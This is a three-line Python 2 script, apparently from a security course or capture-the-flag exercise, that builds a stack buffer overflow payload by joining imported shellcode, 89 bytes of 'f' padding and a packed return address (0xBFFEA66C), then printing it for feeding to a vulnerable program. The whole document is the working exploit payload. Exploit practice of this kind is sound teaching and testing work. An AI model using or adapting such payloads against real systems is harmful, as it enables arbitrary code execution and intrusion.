from shellcode import shellcode
from struct import pack

print shellcode + "f"*89 + pack("<I", 0xBFFEA66C)
